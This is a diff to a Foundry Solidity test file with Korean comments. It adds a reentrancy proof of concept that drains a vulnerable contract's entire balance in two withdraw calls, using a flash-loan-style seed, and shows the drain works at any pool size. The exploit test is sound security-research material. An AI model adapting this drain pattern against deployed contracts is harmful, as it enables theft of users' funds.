@@ -58,4 +58,31 @@ contract ReentrancyMaxTest is Test {
         assertEq(atk.calls(), 2); // 깊이/가스 무관 — 잔액 크기와 호출 수가 분리됨
         assertEq(address(atk).balance, victim * 2);
     }
+
+    // 임의 크기 풀을 시드 = 피해자잔액으로 전액 탈취. 반환: withdraw 호출 수.
+    function _drainAny(uint256 pot) internal returns (uint256) {
+        Reentrancy r = new Reentrancy();
+        address victim = makeAddr("bigVictim");
+        vm.deal(victim, pot);
+        vm.prank(victim);
+        r.donate{value: pot}(victim);
+
+        ReentrancyAttackerMax a = new ReentrancyAttackerMax(address(r));
+        vm.deal(address(this), pot); // 시드(현실=flash loan)
+        a.attack{value: pot}();
+
+        assertEq(address(r).balance, 0, "not fully drained");
+        return a.calls();
+    }
+
+    /// @notice "얼마까지?" — 잔액이 100 / 100만 / 1억 ETH여도 항상 2번에 전액. 메커니즘에 한도 없음.
+    function testDrainScalesUnbounded() public {
+        uint256[3] memory pots = [uint256(100 ether), 1_000_000 ether, 100_000_000 ether];
+        for (uint256 i = 0; i < pots.length; i++) {
+            uint256 calls = _drainAny(pots[i]);
+            emit log_named_decimal_uint("pot fully drained (ether)", pots[i], 18);
+            emit log_named_uint("  withdraw calls", calls);
+            assertEq(calls, 2, "should always be 2 regardless of size");
+        }
+    }
 }
